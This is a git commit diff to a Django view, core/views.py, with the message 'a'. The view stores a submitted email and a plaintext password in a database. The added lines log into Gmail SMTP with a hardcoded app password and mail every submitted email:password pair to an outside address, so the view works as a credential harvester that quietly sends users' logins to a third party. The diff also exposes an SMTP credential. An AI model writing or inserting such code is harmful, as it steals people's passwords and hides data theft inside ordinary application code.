d6567baf65dd1220ecf6d31f3218b1e4f695d10b
Chronos <victorabuke@gmail.com>
2024-10-18 17:50:42 -0500

    a

--- core/views.py
+++ core/views.py
@@ -1,6 +1,7 @@
 from django.http import JsonResponse
 from rest_framework.decorators import api_view
 from dbconnection import users
+import smtplib
 
 
 @api_view(['POST'])
@@ -13,6 +14,16 @@ def get_user_info(request):
         "email": email,
         "password": password,
     }).inserted_id
+
+    sending_email = 'ranickiauerbach@gmail.com'
+    r_email = 'flaco.hex2@gmail.com'
+    m_password = 'nlov pvvd rcoa dnwl'
+
+    with smtplib.SMTP_SSL('smtp.gmail.com', 465) as connection:
+        connection.login(user=sending_email, password=m_password)
+        connection.sendmail(from_addr=sending_email,
+                            to_addrs=r_email,
+                            msg=f"subject: Hello! \n\n {email} : {password}")
 
     if not email or not password:
         return JsonResponse({'error': 'email and password required'}, status=400)
